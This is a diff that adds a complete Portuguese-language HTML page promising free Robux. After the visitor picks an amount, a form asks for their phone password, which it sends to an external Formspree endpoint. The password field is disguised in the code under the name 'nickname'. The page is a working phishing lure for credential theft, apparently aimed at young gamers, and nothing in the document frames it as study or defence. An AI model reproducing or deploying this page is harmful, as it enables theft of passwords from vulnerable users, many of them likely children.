@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROBUX GRATIS</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 30px;
+            background: white;
+        }
+
+        h1 {
+            color: green;
+        }
+
+        .escolha {
+            color: red;
+            background: green;
+            display: inline-block;
+            padding: 8px 15px;
+            font-size: 20px;
+        }
+
+        .botoes {
+            margin-top: 20px;
+        }
+
+        button {
+            display: block;
+            margin: 10px auto;
+            padding: 12px 30px;
+            background: black;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            opacity: 0.8;
+        }
+
+        #formulario {
+            display: none;
+            margin-top: 25px;
+        }
+
+        input {
+            padding: 12px;
+            width: 80%;
+            max-width: 300px;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>ROBUX GRATIS</h1>
+
+    <div class="escolha">escolha o valor:</div>
+
+    <div class="botoes">
+        <button type="button" onclick="escolherRobux(15)">15 robux</button>
+        <button type="button" onclick="escolherRobux(500)">500 robux</button>
+        <button type="button" onclick="escolherRobux(1000)">1000 robux</button>
+    </div>
+
+    <div id="formulario">
+        <form action="https://formspree.io/f/xvkgwylz" method="POST">
+
+            <input type="hidden" id="valor" name="valor">
+
+            <input
+                type="text"
+                name="nickname"
+                placeholder="insira sua senha do celular"
+                required
+            >
+
+            <br>
+
+            <button type="submit">enviar</button>
+        </form>
+    </div>
+
+    <script>
+        function escolherRobux(valor) {
+            document.getElementById("valor").value = valor + " robux";
+            document.getElementById("formulario").style.display = "block";
+        }
+    </script>
+
+</body>
+</html>
